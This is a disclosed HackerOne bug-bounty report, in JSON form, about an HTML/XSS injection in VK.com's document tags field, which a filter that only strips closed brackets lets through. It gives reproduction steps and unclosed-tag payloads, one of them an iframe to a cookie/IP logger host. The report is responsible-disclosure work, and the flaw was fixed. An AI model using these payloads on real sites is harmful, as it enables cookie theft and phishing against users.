{"id":198907,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTg5MDc=","url":"https://hackerone.com/reports/198907","title":"HTML Injection possible due to bad filter","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-01-17T03:11:25.656Z","submitted_at":"2017-01-17T03:11:25.656Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jackb898","url":"/jackb898","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/CBcmZYZbwyyEjGj5BP7AQ4FK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1254,"url":"https://hackerone.com/vkcom","handle":"vkcom","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/254/4d3964b90290d02f3b41d23a1452c08ca77eec3e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/254/4d3964b90290d02f3b41d23a1452c08ca77eec3e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"VK.com","twitter_handle":"vkontakte","website":"https://vk.com","about":"VK is the largest European social network with more than a 100 million active users."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-10T12:01:31.776Z","bug_reporter_agreed_on_going_public_at":"2017-01-23T03:16:12.216Z","team_member_agreed_on_going_public_at":"2017-02-10T12:01:31.728Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nI have found an area where it may be possible to run certain HTML/JS scripts.\n\nTO REPRODUCE:\n1. Go to documents\n\n2. Upload anything and edit it\n\n3. On the edit page in tags, enter code without a closing bracket ex. \u003cimg src=x\n\n4. Click enter\n\n5. It will be parsed in that area, but after saving it, it won't parse.\n\nPOTENTIAL:\nI'm still looking into this, as this could be a possible XSS vuln if I can find vectors without closing brackets that have harmful code.\n\nWHY IT WORKS:\nThe reason this works is because your filter only looks for opening AND closing brackets, when it is possible to run code without closing the brackets.\n\nThanks,\nKicker\n","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI have found an area where it may be possible to run certain HTML/JS scripts.\u003c/p\u003e\n\n\u003cp\u003eTO REPRODUCE:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eGo to documents\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUpload anything and edit it\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eOn the edit page in tags, enter code without a closing bracket ex. \u0026lt;img src=x\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eClick enter\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eIt will be parsed in that area, but after saving it, it won\u0026#39;t parse.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePOTENTIAL:\u003cbr\u003e\nI\u0026#39;m still looking into this, as this could be a possible XSS vuln if I can find vectors without closing brackets that have harmful code.\u003c/p\u003e\n\n\u003cp\u003eWHY IT WORKS:\u003cbr\u003e\nThe reason this works is because your filter only looks for opening AND closing brackets, when it is possible to run code without closing the brackets.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nKicker\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-02-22T03:16:12.259Z","allow_singular_disclosure_after":-121484187.1528561,"singular_disclosure_allowed":true,"vote_count":11,"voters":["thaivu","brodie_codie","mpz","eveeez","kunal94","jackb898","kiraak-boy","vraj","japz","rbcafe","and 1 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1424512,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Please, include working proof of concept with XSS. ","markdown_message":"\u003cp\u003ePlease, include working proof of concept with XSS. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-17T10:11:12.799Z","updated_at":"2017-01-17T10:11:12.799Z","actor":{"username":"exe","cleared":false,"url":"/exe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/058/768/cb3119e614f25ed716db2258fd649c2cd62b29b1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1424996,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Exe I will followup later today if I find a harmful payload that can run","markdown_message":"\u003cp\u003eExe I will followup later today if I find a harmful payload that can run\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-17T15:08:50.122Z","updated_at":"2017-01-17T15:08:50.122Z","actor":{"username":"jackb898","cleared":true,"url":"/jackb898","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CBcmZYZbwyyEjGj5BP7AQ4FK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1426540,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Alright @exe, here is a much better report.\n\n### DESCRIPTION:\nThis vulnerability occurs in https://vk.com/docs when you click the pencil to edit a document and go to tags. You can type code like \n`\u003cimg src=x onerror=alert(1) foo=` and it will be parsed and run.\n\n### HOW TO REPRODUCE:\n1. Login to any account on VK (desktop)\n\n2. On the left menu, click Documents\n\n3. Upload any random document (doesn't effect vulnerability) or use an uploaded document for the next step\n\n4.  Click the pencil next to the document to edit it\n\n5. On the editing menu, scroll to Tags and type some code without closing brackets \n(ex. `\u003ciframe src=\"cookielogger/iplogger.com\" foo=`)\n\n6.  Click enter and the code will be parsed and run\n\n### WHY IT WORKS\nThis vulnerability works because of an issue that might be a larger issue, which is the filter. The filter used on the tag feature removes all text between two brackets, ex. if you type \u003cimg src=x\u003e the filter removes the brackets and img src=x between, resulting in no text. If you do unicode, it parses but doesn't run, so that is secure, but the filter doesn't remove anything if you don't close the brackets. Not closing brackets, while it does break certain code, doesn't break most HTML code, meaning you can run harmful code such as an iframe to a cookie logger.\n    \nIn conclusion for this section/ shortened message: There may be other areas vulnerable to this if they use this filter, so definitely check for that.\n\n\n\n### WHY IT IS HARMFUL\nThis could be used harmfully by black hats, as they could tell a friend to go to documents and edit and paste the code for some admin permissions (just made that up, could be any scenario), and upon clicking enter, it could log  their cookies/ip or lead to a phishing site to get their password.\n\n### SUGGESTED REMEDIATION\nI suggest that you use the filter used for usernames, which removes special characters, and this would prevent XSS from executing in the tags.\n\nThanks,\nKicker\n","markdown_message":"\u003cp\u003eAlright \u003ca href=\"/exe\"\u003e@exe\u003c/a\u003e, here is a much better report.\u003c/p\u003e\n\n\u003ch3 id=\"description\"\u003eDESCRIPTION:\u003c/h3\u003e\n\n\u003cp\u003eThis vulnerability occurs in \u003ca title=\"https://vk.com/docs\" href=\"/redirect?url=https%3A%2F%2Fvk.com%2Fdocs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vk.com/docs\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e when you click the pencil to edit a document and go to tags. You can type code like \u003cbr\u003e\n\u003ccode\u003e\u0026lt;img src=x onerror=alert(1) foo=\u003c/code\u003e and it will be parsed and run.\u003c/p\u003e\n\n\u003ch3 id=\"how-to-reproduce\"\u003eHOW TO REPRODUCE:\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eLogin to any account on VK (desktop)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eOn the left menu, click Documents\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUpload any random document (doesn\u0026#39;t effect vulnerability) or use an uploaded document for the next step\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eClick the pencil next to the document to edit it\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eOn the editing menu, scroll to Tags and type some code without closing brackets \u003cbr\u003e\n(ex. \u003ccode\u003e\u0026lt;iframe src=\u0026quot;cookielogger/iplogger.com\u0026quot; foo=\u003c/code\u003e)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eClick enter and the code will be parsed and run\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"why-it-works\"\u003eWHY IT WORKS\u003c/h3\u003e\n\n\u003cp\u003eThis vulnerability works because of an issue that might be a larger issue, which is the filter. The filter used on the tag feature removes all text between two brackets, ex. if you type \u0026lt;img src=x\u0026gt; the filter removes the brackets and img src=x between, resulting in no text. If you do unicode, it parses but doesn\u0026#39;t run, so that is secure, but the filter doesn\u0026#39;t remove anything if you don\u0026#39;t close the brackets. Not closing brackets, while it does break certain code, doesn\u0026#39;t break most HTML code, meaning you can run harmful code such as an iframe to a cookie logger.\u003c/p\u003e\n\n\u003cp\u003eIn conclusion for this section/ shortened message: There may be other areas vulnerable to this if they use this filter, so definitely check for that.\u003c/p\u003e\n\n\u003ch3 id=\"why-it-is-harmful\"\u003eWHY IT IS HARMFUL\u003c/h3\u003e\n\n\u003cp\u003eThis could be used harmfully by black hats, as they could tell a friend to go to documents and edit and paste the code for some admin permissions (just made that up, could be any scenario), and upon clicking enter, it could log  their cookies/ip or lead to a phishing site to get their password.\u003c/p\u003e\n\n\u003ch3 id=\"suggested-remediation\"\u003eSUGGESTED REMEDIATION\u003c/h3\u003e\n\n\u003cp\u003eI suggest that you use the filter used for usernames, which removes special characters, and this would prevent XSS from executing in the tags.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nKicker\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T02:33:32.405Z","updated_at":"2017-01-18T02:36:10.470Z","actor":{"username":"jackb898","cleared":true,"url":"/jackb898","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CBcmZYZbwyyEjGj5BP7AQ4FK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1427096,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for the report. We will investigate this issue and write you back.","markdown_message":"\u003cp\u003eThank you for the report. We will investigate this issue and write you back.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T10:27:31.489Z","updated_at":"2017-01-18T10:27:31.489Z","actor":{"username":"exe","cleared":false,"url":"/exe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/058/768/cb3119e614f25ed716db2258fd649c2cd62b29b1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1428933,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you want the report Type and Severity corrected, please change it to Type: XSS and severity: Medium (that's this vulnerability's severity in my opinion)","markdown_message":"\u003cp\u003eIf you want the report Type and Severity corrected, please change it to Type: XSS and severity: Medium (that\u0026#39;s this vulnerability\u0026#39;s severity in my opinion)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-19T00:28:03.164Z","updated_at":"2017-01-19T00:28:03.164Z","actor":{"username":"jackb898","cleared":true,"url":"/jackb898","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CBcmZYZbwyyEjGj5BP7AQ4FK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1432326,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We resolved this issue. Please, check. \n\nThat was a self-xss vulnerability. We do not pay for them, but thank you for the report. ","markdown_message":"\u003cp\u003eWe resolved this issue. Please, check. \u003c/p\u003e\n\n\u003cp\u003eThat was a self-xss vulnerability. We do not pay for them, but thank you for the report. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-20T11:21:16.856Z","updated_at":"2017-01-20T11:21:16.856Z","actor":{"username":"exe","cleared":false,"url":"/exe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/058/768/cb3119e614f25ed716db2258fd649c2cd62b29b1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jackb898","url":"/jackb898"},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1437457,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"@exe i can confirm it is fixed. May we disclose this?","markdown_message":"\u003cp\u003e\u003ca href=\"/exe\"\u003e@exe\u003c/a\u003e i can confirm it is fixed. May we disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-23T03:16:12.235Z","updated_at":"2017-01-23T03:16:12.235Z","first_to_agree":true,"actor":{"username":"jackb898","cleared":true,"url":"/jackb898","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CBcmZYZbwyyEjGj5BP7AQ4FK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1474389,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-09T12:57:54.278Z","updated_at":"2017-02-09T12:57:54.278Z","actor":{"url":"/vkcom","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/254/4d3964b90290d02f3b41d23a1452c08ca77eec3e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"VK.com"}},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1474391,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"How should we disclose this report? Full or limited?","markdown_message":"\u003cp\u003eHow should we disclose this report? Full or limited?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-09T12:58:44.568Z","updated_at":"2017-02-09T12:58:44.568Z","actor":{"username":"mihver1","cleared":false,"url":"/mihver1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1476118,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mihver1 doesn't matter to me, whatever your company wants.","markdown_message":"\u003cp\u003e\u003ca href=\"/mihver1\"\u003e@mihver1\u003c/a\u003e doesn\u0026#39;t matter to me, whatever your company wants.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-10T01:42:55.329Z","updated_at":"2017-02-10T01:42:55.329Z","actor":{"username":"jackb898","cleared":true,"url":"/jackb898","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CBcmZYZbwyyEjGj5BP7AQ4FK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1476901,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-10T12:00:49.988Z","updated_at":"2018-02-28T13:10:59.933Z","additional_data":{"added_weaknesses":[{"id":60,"name":"Cross-site Scripting (XSS) - Generic"}],"removed_weaknesses":[{"id":58,"name":"Command Injection - Generic"}]},"actor":{"username":"mihver1","cleared":false,"url":"/mihver1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1476902,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-10T12:01:31.745Z","updated_at":"2017-02-10T12:01:31.745Z","actor":{"username":"mihver1","cleared":false,"url":"/mihver1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1476903,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-10T12:01:31.790Z","updated_at":"2017-02-10T12:01:31.790Z","actor":{"username":"mihver1","cleared":false,"url":"/mihver1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vkcom","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}